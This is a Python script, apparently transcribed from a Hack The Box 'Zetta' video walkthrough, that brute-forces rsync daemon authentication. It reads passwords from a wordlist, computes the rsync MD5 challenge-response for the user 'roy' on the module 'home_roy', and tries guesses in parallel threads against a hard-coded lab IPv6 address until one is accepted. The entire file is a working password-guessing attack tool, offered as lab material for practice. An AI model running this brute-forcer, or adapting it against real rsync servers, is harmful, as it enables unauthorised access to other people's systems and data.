#
# Code from Ippsec Zetta HTB YouTube Video
#
# Ippsec Zetta YouTube https://youtu.be/8XmTz3A5rUo
#

import concurrent.futures
from time import sleep
from random import randint
from base64 import b64encode, b64decode
from socket import *
import hashlib

RHOST = "dead:beef::250:56ff:feb9:8dfc"
RPORT = 8730
MAX_WORKERS = 5

def generate_hash(password, challenge):
    password = password.encode()
    challenge = challenge.encode()
    m = hashlib.new('md5')
    m.update(password)
    m.update(challenge)

    md5_hash = b64encode(m.digest())
    md5_hash = md5_hash.decode()
    md5_hash = md5_hash.replace('=','').strip()

    return md5_hash

def login(password):
    
    password = password.strip()
    print("\r" + password + " ", flush=False, end='')            
    addrinfo = getaddrinfo(RHOST, RPORT, AF_INET6, SOCK_STREAM)
    (family, socktype, proto, canonname, sockaddr) = (addrinfo[0])
    s = socket(family, socktype, proto)
    s.connect(sockaddr)
    output = s.recv(4096)
    s.send("@RSYNCD: 31.0\n".encode())
    output = s.recv(4096)
    s.send("home_roy\n".encode())
    output = s.recv(4096)
    challenge = output.split(' '.encode())[2].strip().decode()
    response = generate_hash(password, challenge)
    s.send(f"roy {response}\n".encode())
    output = s.recv(4096)
    s.close()

    if "@RSYNCD: OK".encode() in output:
        print("\r" + password + " \n", flush=True, end='')        
        return True
    else:
        return False    


with open("wordlist.txt") as f:
    list_to_process = []

    done = False

    while not done:
        for i in range(0,MAX_WORKERS):
            password = f.readline().strip()
            if len(password) == 0:
                print("Finished reading")
                done = True
            else:
                list_to_process.append(password)
    
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
   
            job = {executor.submit(login, password): password for password in list_to_process} 
            
            for future in concurrent.futures.as_completed(job):
                if future.result():
                    done = True

        list_to_process.clear()

        




